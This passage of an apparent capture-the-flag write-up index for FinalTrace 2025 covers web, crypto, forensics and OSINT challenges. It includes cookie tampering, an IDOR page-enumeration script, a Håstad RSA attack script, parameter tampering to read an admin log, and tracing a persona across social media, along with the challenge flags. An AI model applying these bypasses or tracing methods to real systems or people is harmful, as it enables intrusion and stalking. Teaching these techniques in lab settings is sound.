5: Visit the URLOpened the URL on rentry.org. Found the final flag.FlagCYS{INH4RM0N1C_DO0R_UNL0CK3D}" }, { "title": "Phantom Fingerprints", "url": "/writeups/FinalTrace_2025/28--category-forensics.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "## Category: [Forensics] Author: [Htarizzs]Challenge Description[Use the provided netcat service and query logs to identify and analyze the activity of a phantom user whose fingerprints appear in...", "content": "## Category: [Forensics] Author: [Htarizzs]Challenge Description[Use the provided netcat service and query logs to identify and analyze the activity of a phantom user whose fingerprints appear in the device logs, but who does not correspond to any registered account. Find and submit their session’s flag.]SolutionInitial Analysis Reconnaissance Begin by connecting to the provided netcat service (e.g., nc challenge.host 1337).Review the welcome message, available commands (usually presented with a help command), and the structure of returned data. Information GatheringUse commands like show logs, query user , query fingerprint , etc., to get an inventory of normal and phantom records, paying attention to any IDs, timestamps, or unusual entries.Tools Used [netcat (nc)] [python3 (py)]Step-by-Step SolutionStep 1: [Connect &amp; Explore]nc localhost 1337helpshow logs[The terminal is bought up, which will only work with specific commands which are specified in help.]Step 2: [Find the phantom user]query user 0x9999query fingerprint fp9999[Phantom(Unknown) user is found out, and try inspecting their fingerprint to get the flag in base64 format]Step 3: [Decode the base64 string]Decoding the base64 string obtained will give the flagFlagCYS{ph4n7om_v3n0m}" }, { "title": "To Hehe with Lyra's Echoes", "url": "/writeups/FinalTrace_2025/29-ToHehewithLyrasEchoes.html", "categories": "General", "tags": "", "date": "", "snippet": "Basically you’re treated with the link.https://echositee.vercel.app/If you open the site, it’ll lead you to the login page where you’ll be asked for a username and the password. But don’t you worry...", "content": "Basically you’re treated with the link.https://echositee.vercel.app/If you open the site, it’ll lead you to the login page where you’ll be asked for a username and the password. But don’t you worry because if you openInspect -&gt; JavaScript segment of the codeYou’ll see username = lyraPassword = Base16 version of $#1n0332Decode it and then enter the site The site is broken with not visible images.From there, get the steg image (the third image in the site) Also if you press it, you may see a flag like thing, don’t worry it’s a RED herring.Then if you get echoes.jpg and dosteghide extract -sf echoes.jpgAnd then for the passphrase, put $#1n0332 because I have already given in the description that her passwords became the same everywhere, so putting it leads you to get a Drive linkIf you open the Drive Link, you’ll be rewarded with a PDF.If you open the PDF, you can see that some texts are redacted. But no issues because if you copy all the texts and put in a notepad.As you can see after this process, everything makes sense until in the end, there is random gibberishIf you look closely, it’s the last part of a pastebin URL.If you put it along with the full pastebin URL, you’ll be rewarded with DOT cipherPut it in thins link,https://www.dcode.fr/pollux-cipherWhen decoded gives the full actual FLAG!CYS{HERACTUALECHOES}" }, { "title": "Shattered Glass Logs", "url": "/writeups/FinalTrace_2025/30-shattered-glass-logs.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Shattered Glass Logs Category: [Forensics] Author: [Htarizzs]Challenge Description[Find the flag by reconstructing the hidden message scattered across multiple fragmented and tampered system logs...", "content": "Shattered Glass Logs Category: [Forensics] Author: [Htarizzs]Challenge Description[Find the flag by reconstructing the hidden message scattered across multiple fragmented and tampered system logs.]SolutionInitial Analysis ReconnaissanceUpon receiving several .log files, started with a manual inspection using cat and less to preview their contents and overall event structures. Metadata &amp; Consistency CheckExamined timestamps, event flows, and error messages for clues about which log fragments could be authentic versus tampered. Keyword/Pattern SearchUsed grep to extract all unique data fragments and looked for recurring suspicious patterns—like out-of-place error codes or data that did not match the rest of the logs.Tools Used [grep] [neovim] [online vignere cypher/decypher tool]Step-by-Step SolutionStep 1: [List and Inspect Log files][There are 5 log files, go through them]Step 2: [Look for Curly braces][Look for logs containing the curly braces, as it is unusual for a log and most prolly a flag]Step 3: [Search for any word that is out of place][As the found flag is encrypted using Vignere cypher, it requires an extra key, hence this word is prolly that! Here, it is cyscom]FlagCYS{gl4ss_un5h4tt3rd}" }, { "title": "The Infinite Gate", "url": "/writeups/FinalTrace_2025/31-the-infinite-gate.html", "categories": "Web", "tags": "", "date": "", "snippet": "The Infinite Gate Category: Web Author: AadhyanthChallenge DescriptionHark, seeker of the Inner Sanctum! Before thee looms the Infinite Gate, an edifice not wrought by mortal hands, but sung into...", "content": "The Infinite Gate Category: Web Author: AadhyanthChallenge DescriptionHark, seeker of the Inner Sanctum! Before thee looms the Infinite Gate, an edifice not wrought by mortal hands, but sung into existence from the very stone of eternity. Its Guardian, ancient beyond reckoning, permits none to pass save those deemed worthy. Upon presenting thy claim, a fragment of thy very essence - thy digital soul-print, if you will - is etched by the Gate’s magic. This token, unseen yet potent, marks thee as either Guest or… something more.The mechanism of this ward is steeped in the forgotten lore of Elara the Astromancer. She who mapped the celestial curves believed that identity itself could be represented, measured, perhaps even… altered. It is said the Gate judges not the strength of thy arm nor the purity of thy heart, but the subtle quality of the essence-token it bestows upon thee.The Guardian speaks true: a pass is merely a token. Can such a thing, once given, be reshaped by mortal will? Can simple wit suffice where might fails? Approach the Gate, receive thy mark, and discover if thou possess the wit to bend its ancient, rigid judgment to thy purpose. The Inner Sanctum awaits only those who can prove their essence is more than what the Gate initially perceives.Tools Used Devtools PythonStep-by-Step SolutionStep 1:Open devtools (F12) view cookies under the Application tab and log in with any username and passwordStep 2:Alter the UserCunning cookie from false to true and move to the next pageStep 3: [Step Title]Copy the given json file and decrypt using Elliptic-Curve Cryptographyimport jsondef solve_challenge(): \"\"\" Loads challenge.json, solves the ECC challenge, and prints the flag. \"\"\" print(\"Loading challenge.json...\") try: with open('challenge.json', 'r') as f: data = json.load(f) except FileNotFoundError: print(\"Error: challenge.json not found in the same directory.\") return except json.JSONDecodeError: print(\"Error: Could not decode challenge.json.\") return p = data[\"p\"] a = data[\"a\"] b = data[\"b\"] xs_hex = data[\"xs_hex\"] flag_bits_len = data[\"flag_bits_len\"] # The p % 8 check is no longer relevant # if p % 8 != 5: # print(f\"Warning: Prime p % 8 is not 5 (it's {p % 8}).\") # print(\"The mod_sqrt function may not be optimal, but let's proceed.\") print(f\"Loaded curve parameters and {len(xs_hex)} x-coordinates.\") bit_string = \"\" for i, x_hex in enumerate(xs_hex): x = int(x_hex, 16) # Calculate y^2 = x^3 + ax + b (mod p) # We use pow(x, 3, p) for (x^3 % p) x3 = pow(x, 3, p) ax = (a * x) % p # Ensure intermediate results stay positive y_squared = (x3 + ax + b) % p if y_squared &lt; 0: y_squared += p # --- MODIFIED LOGIC --- # The error \"No modular square root\" indicates that y^2 is not # always a quadratic residue. This implies the flag bit is # encoded in the *existence* of a root, not its value. # We check this using the Legendre symbol. # legendre = pow(y_squared, (p - 1) // 2, p) # # legendre == 1 =&gt; y^2 is a quadratic residue (y exists, y != 0) # legendre == p - 1 =&gt; y^2 is a quadratic non-residue (y does not exist) # legendre == 0 =&gt; y^2 is 0 (y = 0) legendre_symbol = pow(y_squared, (p - 1) // 2, p) # Hypothesis: Bit is 1 if it's a residue, 0 otherwise. # We treat the y=0 case (legendre_symbol == 0) as bit 0, # as the LSB of y=0 would be 0. if legendre_symbol == 1: bit_string += \"1\" else: # This covers non-residues (p-1) and the y=0 case (0) bit_string += \"0\" # --- END MODIFIED LOGIC --- print(f\"Successfully generated {len(bit_string)} bits.\") if len(bit_string) != flag_bits_len: print(f\"Error: Expected {flag_bits_len} bits, but got {len(bit_string)}.\") return # Convert the full bit string into bytes try: flag_bytes = bytearray() for i in range(0, flag_bits_len, 8): byte_str = bit_string[i:i+8] byte_val = int(byte_str, 2) flag_bytes.append(byte_val) # Decode the bytes as an ASCII string flag = flag_bytes.decode('ascii') print(\"\\n--- FLAG ---\") print(flag) print(\"--------------\") except UnicodeDecodeError: print(\"\\nError: Could not decode the resulting bytes into ASCII.\") print(f\"Raw bytes: {flag_bytes.hex()}\") except Exception as e: print(f\"\\nAn error occurred during flag decoding: {e}\")if __name__ == \"__main__\": solve_challenge()The above is working code that you can easily get through prompt engineeringFlagCYS{c00k1eS_ar3_m34nt_t0_b3_br0k3n}" }, { "title": "Auditor's Diary", "url": "/writeups/FinalTrace_2025/32-auditors-diary.html", "categories": "OSINT/TEXT", "tags": "", "date": "", "snippet": "Auditor’s Diary Category: OSINT/TEXT Author: S S Kishore KumarChallenge DescriptionYou given the Auditor’s Log: MDE-12.1993 from the Auditor’s diary .There is famous foreign historical figure hid...", "content": "Auditor’s Diary Category: OSINT/TEXT Author: S S Kishore KumarChallenge DescriptionYou given the Auditor’s Log: MDE-12.1993 from the Auditor’s diary .There is famous foreign historical figure hidden in the file.Identify him and the CEO of the company named after him is gives you the flag.Flag format : CYS{} (all in lower-case , with no spaces).SolutionInitial AnalysisRead the log and find its about Pablo Escobar , The company Escobar Inc. and its founder Olof K GustafssonTools Used Wikipedia TextfileStep-by-Step SolutionStep 1: [Read the audit-diary.md]The log in it is based on Pablo Escobar.Step 2: [Find the founder]The company based of him is Escobar Inc. and its founder is Olof K GustafssonFlagCYS{olofkgustafsson}" }, { "title": "Reconfiguration Terminal", "url": "/writeups/FinalTrace_2025/33-reconfiguration-terminal.html", "categories": "General", "tags": "", "date": "", "snippet": "Reconfiguration TerminalCategory: Web ExploitationAuthor: Yashwant Gokul PChallenge Description: The site is minimal but the hint “Numbers are truth…” suggests a numeric resource pattern; a quick,...", "content": "Reconfiguration TerminalCategory: Web ExploitationAuthor: Yashwant Gokul PChallenge Description: The site is minimal but the hint “Numbers are truth…” suggests a numeric resource pattern; a quick, low-noise check of robots.txt confirmed a disallowed numeric path and pointed toward a /safe/&lt;id&gt; namespace. Manual requests to a few /safe/&lt;n&gt; pages returned single characters inside the HTML (200 for valid indices, 404 at the end), which indicates an information-disclosure/enumeration weakness — essentially a CTF-style IDOR/predictable resource issue. The logical next step is to automate sequential requests to /safe/1, /safe/2, …, parse each response for the character, and concatenate them to reconstruct the CYS{...} flagSolution:Initial Analysis: The site is minimal but the hint “Numbers are truth…” suggests a numeric resource pattern; a quick, low-noise check of robots.txt confirmed a disallowed numeric path and pointed toward a /safe/&lt;id&gt; namespace. Manual requests to a few /safe/&lt;n&gt; pages returned single characters inside the HTML (200 for valid indices, 404 at the end), which indicates an information-disclosure/enumeration weakness — essentially a CTF-style IDOR/predictable resource issue. The logical next step is to automate sequential requests to /safe/1, /safe/2, …, parse each response for the character, and concatenate them to reconstruct the CYS{...} flag.Tools Used: Python3Step-by-Step Solution: You are given with a url https://reconfiguration-terminal.netlify.app/ The site looks minimal, and it even displays the line “Numbers are truth, and truth always leaks through the cracks,” hinting at a possible IDOR weakness and suggesting there could be hidden clues in the page source, cookies, or other client-side artifacts. A good next step is to check the site’s robots.txt (e.g., https://example.com/robots.txt). That file, located at a site’s root, tells crawlers which paths to index or avoid—so it’s often a quick way to discover hidden or disallowed endpoints that might reveal useful information. We found something interesting in robots.txt: Disallow: /safe/420. That suggests the site might expose a hidden page and could indicate an IDOR (Insecure Direct Object Reference) issue. Let’s probe /safe/1 to see whether the site is vulnerable.Our intuition paid off: changing the page ID (for example to 2 and 3) returned Y and S, which matches the expected flag pattern. We don’t yet know the flag’s length, so manually visiting pages would be slow and error-prone. Instead, we’ll automate the process with a simple Python script that requests /safe/&lt;n&gt;, extracts the character from each page, and builds the flag for us. Our intuition paid off: changing the page ID (for example to 2 and 3) returned Y and S, which matches the expected flag pattern. We don’t yet know the flag’s length, so manually visiting pages would be slow and error-prone. Instead, we’ll automate the process with a simple Python script that requests /safe/&lt;n&gt;, extracts the character from each page, and builds the flag for us. import requests from bs4 import BeautifulSoup BASE = \"https://reconfiguration-terminal.netlify.app/safe/{}\" flag = \"\" i = 1 while True: url = BASE.format(i) r = requests.get(url) if r.status_code == 404: print(\"404 reached. Stopping.\") break elif r.status_code == 200: # parse the HTML and get only the text inside &lt;p&gt; soup = BeautifulSoup(r.text, \"html.parser\") p = soup.find(\"p\") if p: char = p.text.strip() flag += char print(f\"Page {i} found. Flag so far: {flag}\") else: print(f\"Page {i} found but no &lt;p&gt; tag!\") i += 1 print(\"\\nFinal Flag:\", flag) chatgpt chat history : https://chatgpt.com/share/68f10e84-a100-8003-b373-216bc62c34b0 If we run this code on our system, it will automatically fetch all the pages and reveal the flag. Flag: CYS{7h3_h0ur6l455_5h4773r3d_bu7_m3m0ry_r3m41n5_1n_fr46m3n75_pl3453_l1573n_cl053r_65537_2025}" }, { "title": "Paradox Parable", "url": "/writeups/FinalTrace_2025/34-unknown-challenge.html", "categories": "General", "tags": "", "date": "", "snippet": "This is a Easy Forensics challenge based on data carving an appended archive from a PNG file.The challenge includes a decoy flag and a misleading handbook:Decoy Flag: Running strings Paradox_Parabl...", "content": "This is a Easy Forensics challenge based on data carving an appended archive from a PNG file.The challenge includes a decoy flag and a misleading handbook:Decoy Flag: Running strings Paradox_Parable_Image.png reveals the false flag: CYS{early_belief}.The player must use binwalk to scan the file’s binary structure for embedded signaturesCommand:binwalk -e Paradox_Parable_Image.pngwill give a extracted file with the true flag : CYS{binwalk_reveals_truth}" }, { "title": "Temporal Mergepoint", "url": "/writeups/FinalTrace_2025/35-unknown-challenge.html", "categories": "General", "tags": "", "date": "", "snippet": " Author: riya mishraChallenge DescriptionAccess control in a futuristic research portal fails. Users can view logs via /portal?user_id=. Can you find the secret flag by manipulating parameters?Sol...", "content": " Author: riya mishraChallenge DescriptionAccess control in a futuristic research portal fails. Users can view logs via /portal?user_id=. Can you find the secret flag by manipulating parameters?SolutionInitial AnalysisVisited / and saw hints about the portal endpoint. Tried accessing my user ID first.Tools UsedWeb Browser (Chrome/Edge)Burp Suite (optional)Python Flask serverStep-by-Step SolutionStep 1: Check my own logstextVisited: http://127.0.0.1:5000/portal?user_id=10Result: {“user”:”player”,”log”:”Access denied: unauthorized”}Access was denied for default user.Step 2: Test other IDstextChanged to: http://127.0.0.1:5000/portal?user_id=9Result: {“user”:”admin”,”log”:”CYS{temporal_merge_success}”}Found that the server returned the flag for user ID 9.FlagtextCYS{temporal_merge_success}" }, { "title": "Maelle Confrontation", "url": "/writeups/FinalTrace_2025/36-maelle-confrontation.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "Maelle Confrontation Category: [OSINT] Author: [ace6002] Level: [Medium]Challenge DescriptionMulti flag OSINT based on social media/tracking down a certain user.Question to be givenBeneath whisp...", "content": "Maelle Confrontation Category: [OSINT] Author: [ace6002] Level: [Medium]Challenge DescriptionMulti flag OSINT based on social media/tracking down a certain user.Question to be givenBeneath whispers of the forgotten web, one name drifts between the cracks: 1skim. Seek not the obvious, but what lingers behind the veil of public traces. Threads lead where shadows meet data. The flag is no secret—only unseen. Follow the noise, and let open eyes find the hidden truth.SolutionTools Used [Instagram, bsky.app, Discord]Step 1: Take given username in question (1skim_) and find the instagram account with the same username.Step 2: There are 2 posts. Each post leads to a different flag.Path 1: Post 1 states man, i sure love bisky kruger from HxH. definitely one of the best teachers out there. shes for sure my number 2. The hint lies with bisky it translates to bsky i.e. bsky.app. A twitter alternative, much lesser known. Search for username 2skim on bsky.app, the player will find the flag 1, in base64.Path 2: Post 2 states goat. did you know laid loved Clyde more than anything? that's my number 3 though, god knows how it's his top. The hint lies with Clyde. Sent a request to the discord username 3skim_. In the About Me lies a clue, ANIME LOVAR. NO QUESTIONIG. It really has some Soul in it you know, unlike Hollywood. the clue here is AnimeSoul, the largest public anime server on Discord. The status of 3skim_ reads just chillin', another clue. Join AnimeSoul, head into #chill-chat, and search for messages by 3skim_. There is only one message, with the flag in base64.Flag 1CYS{l0v3_Y0uu}Flag 2CYS{d3nyy}" }, { "title": "Auditor Encounter", "url": "/writeups/FinalTrace_2025/37-challenge-name.html", "categories": "Web / ARG", "tags": "", "date": "", "snippet": " Category: Web / ARG Author: OviyaChallenge DescriptionAn animated in-page “Auditor” asks a single question: “Do you regret what you created?”This is a static web challenge (HTML + CSS + JS). The...", "content": " Category: Web / ARG Author: OviyaChallenge DescriptionAn animated in-page “Auditor” asks a single question: “Do you regret what you created?”This is a static web challenge (HTML + CSS + JS). The player replies via a small dialogue input. If the player responds with yes, the Auditor prints the flag; no yields a cryptic denial. The flag is obfuscated (base64) inside the client-side script.SolutionInitial AnalysisI opened the challenge in the browser and inspected the page source. Since the site is static, I looked for client-side JavaScript (either inline or linked as static/script.js). The flag was not directly visible in the HTML, so I checked the JavaScript file for any encoded strings or decode logic.Tools Used Browser Developer Tools (View Source / DevTools) Text editor (VSCode) Command line base64 utilities or Python for decodingStep-by-Step SolutionStep 1: Open the page and view source / linked scriptIn the browser: Right click → View Page SourceOr open linked file directly:open static/script.js # or use your editor to open the fileExplanation: The page is static. The script reference (static/script.js) contains the dialogue logic and probably hides the flag in an encoded form.Step 2: Locate the base64-encoded flag string in the JavaScriptSearch for common patterns in the JS filegrep -n “FLAG_B64” static/script.jsor open the file and look for base64-like strings (long strings with letters/numbers/+ / =)Explanation: The script held a variable named FLAG_B64 with a base64 string. This indicates the flag is client-side but obfuscated.Step 3: Decode the base64 string to obtain the flagExample using Linux base64 tool (replace the string with the one found)echo ‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’ | base64 –decodeOR using Python:python3 -c “import base64; print(base64.b64decode(‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’).decode())”OR in browser console (if the site exposes it):atob(‘Q1lTfGF1ZGl0X3JlZ3JldC5wYXNzfQ==’)Explanation: Decoding the base64 string reveals the flag in plain text. Any of the above methods will produce the same result.FlagCYS{aud1t_regr3t_pass}" }, { "title": "Citadel Entry Lock", "url": "/writeups/FinalTrace_2025/38-citadel-entry-lock.html", "categories": "General", "tags": "", "date": "", "snippet": "Key 1 — SEALObservation The puzzle presents a 16×16 symbol grid → hint: hex (16 values: 0x0–0xF). One edge (first row / first column) contains a set of unique symbols which map to the 16 hex digi...", "content": "Key 1 — SEALObservation The puzzle presents a 16×16 symbol grid → hint: hex (16 values: 0x0–0xF). One edge (first row / first column) contains a set of unique symbols which map to the 16 hex digits. Some symbols are visually distinct (black-haired vs white-haired). The black-haired symbol positions encode the meaningful bytes.Method Map each unique symbol in the first row (or first column) to the hex digits 0x0–0xF. For the black-haired symbol occurrences, read the mapped hex bytes in sequence. Convert the resulting hex byte sequence to ASCII.Extracted data53 45 41 4C 𓀅 𓀃 𓀄 𓀅 𓀄 𓀁 𓀄 𓀌Interpreting the ASCII bytes 53 45 41 4C → \"SEAL\".Result (Key 1): SEALKey 2 — RAID (Håstad / low-exponent broadcast attack)Problem summary You are given three RSA public keys with a small, identical public exponent e = 3 and three ciphertexts c1, c2, c3. The same plaintext m was encrypted under each modulus n1, n2, n3. This is the classic setting for Håstad’s Broadcast Attack: when the same message is encrypted with small e and pairwise-coprime moduli, use CRT and extract the integer e-th root.Mathematical setupWe have:[m^3 \\equiv c_1 \\pmod{n_1},\\qquadm^3 \\equiv c_2 \\pmod{n_2},\\qquadm^3 \\equiv c_3 \\pmod{n_3}.]If the moduli are pairwise coprime and (m^3 &lt; n_1 n_2 n_3), then the CRT combined value (X) equals the integer (m^3). Recover (m) by taking the integer cube root.Given values index modulus (n_i) ciphertext (c_i) 1 20000000000003 120045155700768461749 2 30000000000007 22749457632 3 40000000000009 2800451557007722749457632 e 3 (public exponent) Solution steps (summary) Use the Chinese Remainder Theorem (CRT) to compute X such that X ≡ c_i (mod n_i) for all i. This produces a unique X modulo N_total = n1*n2*n3. If m^3 &lt; N_total, X equals m^3 as an integer. Compute the integer cube root of X to recover m. Convert m (integer) to a big-endian hex string and then to ASCII to read the plaintext.Python reference (concise, reproducible)# Requires: sympy, gmpy2from sympy.ntheory.modular import crtfrom gmpy2 import iroot# Provided moduli and ciphertextsn = [ 20000000000003, # n1 30000000000007, # n2 40000000000009 # n3]c = [ 120045155700768461749, # c1 22749457632, # c2 2800451557007722749457632 # c3]e = 3# 1) CRT -&gt; resultant = m^3resultant, modulus = crt(n, c)print(\"CRT result (m^3):\", resultant)# 2) integer cube rootm_int, is_perfect = iroot(resultant, e)if not is_perfect: raise ValueError(\"CRT result is not a perfect cube; attack failed.\")print(\"Recovered integer m:\", m_int)# 3) convert to ASCIIhex_val = hex(int(m_int))[2:]if len(hex_val) % 2: hex_val = \"0\" + hex_valplaintext = bytes.fromhex(hex_val).decode('ascii')print(\"Plaintext:\", plaintext)Intermediate / expected values CRT result m^3 (as computed): 262800451557007722749457632 Integer cube root m: 1380010308 Hex of m (big-endian): 0x52414944 → ASCII: \"RAID\"Result (Key 2): RAIDKey 3 — CROSSObservation A word search / letter grid with very few actual English words. The visible words (the only real words in the grid) are \"THE\", \"ANSWER\", \"IS\", \"CROSS\".Method Either brute-force search the grid for words or visually scan it. The sequence of real words forms the phrase: “THE ANSWER IS CROSS”.Result (Key 3): CROSSKey 4 — MAATOverviewThe ciphertext is a layered transformation pipeline. Working backwards through the layers yields a SHA-512 digest which, when interpreted/decoded, produces the key.Pipeline (as given / reversed) SKIP CIPHER (size = 17) → produces a tokenized string TWIN HEX transformation KENNY LANG (South Park / simple substitution style encoding) TWIN HEX SHA512 ASCII decode → final keyNotable intermediate SKIP CIPHER(SIZE=17):```1KU55X5KZ5HJ5AX5AL1H75MZ5A85YR5T75HB1AZ5KP5TP5JR5AB1HZ5KB5HK5OR1AW5WX5HZ1HR5KR5TP5W85TZ5AR1AR5HX5TB1AR5T85H85HB1TZ5MZ59Q5T85W85TU5TP5TR5HR5T85HR5KR1AB19R5AJ1XB1SB1AR5TR5WR5HZ1HR5585H81K855Z5K85AZ5AR5T81K85T85HB18R5AJ5W75TR5T71XP19Z5M85HB58R5TP5A85A81Y85YK15Q5H85WR1KR5575AK1AP5TX5T85KZ5HA5KZ5KR5OR5HB5MX5W85HK5AR5HZ5XX5W85A75AS5AP5TX5HK5KZ1T75WR5HB1AZ5KZ10R5W85TZ58P5T85HZ1HZ5WZ5H81KK5HJ1AR5AB1AB1HK5KR1H85KR5HB5HR1TX5WP5W85KR5MR5KZ5A81WB5WX5TR5KB1K85K85571A85881T81H85W85HR5K85TZ5WR5WJ1T75NJ11X1WX1HB5KX5885JB5ZZ1T75TR5AR5175KR5HR5AR5K85YZ5TP5NZ1H75AR1W85TP58P5LX5X75T85HZ- TWIN HEX:1bh5zh58w5xw58w5zk5rh1ba5rk58t5xt1u85rh1kj5rh5pt58t5rk5za1bh5zh58t57558t5za5zh1kn5rh5xt58w5pz1bh5zh58w5pt5zk5zh5ra1bk5rk5zh5pt1rh5rh1bh5za5rh5xt5rk5781bh58w58t5751rh5rk1bh5rk1pt58t5za58t1ja5rk58t5xt5ra5za58w1kj5rh5px1jk5za1ja5rk58w5xw58m5xy1bh5za1pw58w5zk58t1ja5rk58w5755za5791bh58w58t5791ly5ra1a158t5pt1q01kn5rh5755za5ra5rh1ja5zk5zk57858t5751ja5zk5ra5pt58w5q11bk5rk5ra57858m5xx1bk58m1sl18w5zh1ba5rh5ra5xx18t58w1bh5ra5ra5pt5za5xs1ko5zk5px18t58w1bh5ra5zh5791u85rh1ko5ra5xt5zh5py1ba5rh5ra5xt58t5rk5rk1bk58t58m5pt5rk5ra58t1bh58w58t5xt1wm58w1kh58t5755rh5xy1ba5zh5rh57858w5zk5rk- KENNY LANG SOUTHPARK:1mpmfpp4fpppmm1fmpfmp18pmm53mmm1fmmppf1mpmfmf1fmpfpm57mmp1fpm71mpmfpm1pppmmf1pmppmm17mmm1mpfmmp1mpf41mfpfmf17mmp1mmp71fmpffm4fmpfmp1mfpffp53mmm54ppf4fmpfpp4ffp61mpf74fpppfm4fmpfpf1pff51mfpfmf55fmf19fmm17857mmf1pfmfmm4fppppf4fmf14fppmfm1fpm91pmpmff4ffp51pff850ppm1fmmmfp50mfp1mmfmfm1pfp058ppm50mfp1mmfpmf58pmm58mfp1pmm61fmmmfp1fmmpmp1pfmffm1mpmffm1mfpfmp19ffp51fmf1mmp61fpmmmf4fpppmp- TWIN HEX: 1dw4wj1tt18j53a1so1du1tv57b1v71dv1nc1kj17a1fb1f41hu17b1b71ty4tt1hz53a54o4tw4z61f74wp4tx1r51hu55u19s17857c1ps4wo4u14wg1v91ki4z51r850m1sh50h1cg1q058m50h1cl58j58h1j61sh1sk1py1dy1ht19z51u1b61vc4wk- The final SHA-512 digest in the chain is:2db38a0cdf882b8cf7932c685306373042071c8fa147dfe8a4c233b9a57a42eb1004f870b8a9b09552c17dcf81ca2078ffca25fcfa4b8184762f4117d21b98b4**Conclusion**- After reversing the transformations and decoding the SHA-512 result, the plaintext key obtained is: `MAAT`.**Result (Key 4):** `MAAT`---# Key 5 — MAZE**Observation**- Several 8×8-like grids produce SHA-256 digests when unspiralled.- Each grid, when read with the specified outward, left-start, clockwise spiral algorithm, yields an 8×32 (256-bit) SHA256 word fragment.- The puzzle lists grouped hexadecimal 32-byte SHA256 outputs and associates them to English words.**Interpretation**- Spiral Pattern1)20d21a67·ac24d157·0b679998·b4344d9a·83a3b8f3·1b42e0a5·40544695·1c439f902)f826b683·37334d8e·7e46f925·e8670e23·030c2178·3ba7b299·c7c724fc·d1a761ff3)e1900ba2·7ab930f6·017e98af·bc903491·2edbb7c2·9b864a02·bec73e01·bf1f0eac4)808bb15f·07488f45·f05fa88c·0d1d34d6·868bc51c·382a6d05·a305622c·c1ad27d35)416f57f6·65ff5633·517705da·91651f6e·4cfafdac·d8ba9431·51281d5f·d9cdfbe96)11eab27f·623d15ec·099e0f14·be6edf14·7c69d59b·8e7c49da·bd5d9f26·9ad8f2c8- The extracted SHA256 hashes correspond to the phrase: - `The:` `b344d80e24a3679999fa964450b34bc24d1578a35509f934c1418b0a20d21a67` - `key:` `2c70e12b7a0646f92279f427c7b38e7334d8e5389cff167a1dc30e73f826b683` - `you:` `bb0347a468d97e98a9c00e37cebec1ab930f6f1221cae0f1fbb92b07e1900ba2` - `seek:` `cbd345d6a2815fa88d1022650386d07488f45c6c5c3d72da1ca380f0808bb15f` - `is:` `fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6` - `MAZE:` `d9edf594c7669e0f119d2f9d5dece923d15ec44ba68c2f8da9b87b0611eab27f`- Combined phrase: **\"The key you seek is MAZE.\"****Result (Key 5):** `MAZE`---# Key 6 — HODOS**Observation**- A long block of transformed text using a route cipher.- The transformation parameters: horizontal width = **4**; encoding uses a route reading pattern described as: - *Write horizontally from top-left, then read vertical lines from bottom-left* (i.e. a specific route/permutation).**Method**- Implement or use an online route-cipher tool with the given width and read order. Decoding the route cipher recovers a plaintext passage where the key word is clearly visible.**Result (Key 6):** `HODOS`## Decryption script (route cipher — width = 4)```pythonimport math# Ciphertext should be set to the encoded string (use raw string: r\"...\")ciphertext = \"\" # &lt;-- paste ciphertext herewidth = 4# Compute number of rows (each row was written left→right)rows = math.ceil(len(ciphertext) / width)cols = width# Determine how many characters go in each column (left to right)remainder = len(ciphertext) % widthcol_lengths = [rows if i &lt; remainder else rows - 1 for i in range(width)] if remainder else [rows] * width# Split ciphertext into columns as read bottom→top, left→rightcolumns = []idx = 0for c_len in col_lengths: col = ciphertext[idx:idx + c_len] columns.append(col[::-1]) # reverse each column (because read bottom→top) idx += c_len# Reconstruct plaintext by reading horizontally (left→right, top→bottom)plaintext = ''for r in range(rows): for c in range(cols): if r &lt; len(columns[c]): plaintext += columns[c][r]# Replace ⌴ with space (if used in your ciphertext)plaintext = plaintext.replace('⌴', ' ')print(plaintext)Final assemblyAfter recovering each key, assemble them in the instructed order to form the final flag. KEY 1: SEAL KEY 2: RAID KEY 3: CROSS KEY 4: MAAT KEY 5: MAZE KEY 6: HODOSFINAL FLAG:CYS{SEAL_RAID_CROSS_MAAT_MAZE_HODOS}" }, { "title": "Choir Echoes", "url": "/writeups/FinalTrace_2025/39-choir-echoes.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Choir Echoes Category: [Forensics] Author: [ace6002] Level: [Medium]Challenge DescriptionAudio Forensics.Question to be givenYou could not live with your own failures. Where did that bring you? ...", "content": "Choir Echoes Category: [Forensics] Author: [ace6002] Level: [Medium]Challenge DescriptionAudio Forensics.Question to be givenYou could not live with your own failures. Where did that bring you? Back to the beginning. Wear your spectacles better, perhaps you'll succeed this time.SolutionTools Used [Audacity] [Hexedit]Step 1: Hexedit given .wav file, correct the headers from KaFX to RIFF and WAWW to WAVE.Step 2: Read the file using audacity spectrography to find the key. But this is not the flag, its simply the key of a Vigenere Cipher.Step 3: The tail of the file excellente!.wav contains the encoded text TCE{1rrp1ml0} .Step 4: Decode Vigenere using key remy obtained from spectral view to get flag CYS{1tal1an0}.Flag 1CYS{1tal1an0}" }, { "title": "Reflection Logs", "url": "/writeups/FinalTrace_2025/40-reflection-logs.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Reflection Logs Category: Forensics Author: RithvikChallenge DescriptionA fragment of Lyra’s message is buried under multiple layers of compression and presented as a hexdump (tryme.hex, xxd form...", "content": "Reflection Logs Category: Forensics Author: RithvikChallenge DescriptionA fragment of Lyra’s message is buried under multiple layers of compression and presented as a hexdump (tryme.hex, xxd format, ASCII column included). Players must reverse the hexdump, identify the gzip layer, decompress it to reveal a bzip2 file, and then decompress that to recover a text file encoded twice in Base64. Decoding it twice reveals the final flag.SolutionInitial AnalysisThe provided file is a plain-text hexdump generated by xxd, which includes both hexadecimal bytes and an ASCII column. This indicates the original content is binary data encoded as text. The job is to reverse the hexdump to its binary form and peel back compression layers until the Base64 text is reached.Tools Used xxd (to reverse the hexdump) file (to inspect file types via magic bytes) gunzip / gzip -d (to decompress gzip archives) bunzip2 (to decompress bzip2 archives) base64 (to decode the encoded text)Step-by-Step SolutionStep 1: Reconstruct the binary from the hexdumpxxd -r tryme.hex &gt; stage0.binfile stage0.binWhat this does: xxd -r converts the textual hexdump back into the original binary file. Running file on the result reveals the binary’s type by checking magic bytes.Expected output:stage0.bin: gzip compressed data, from Unix, last modified: ...Step 2: Decompress the gzip layer# Option A — rename then gunzip (safe and explicit)mv stage0.bin stage0.gzgunzip stage0.gz# This produces 'stage0' (or the original filename stored inside the archive)# Option B — decompress without 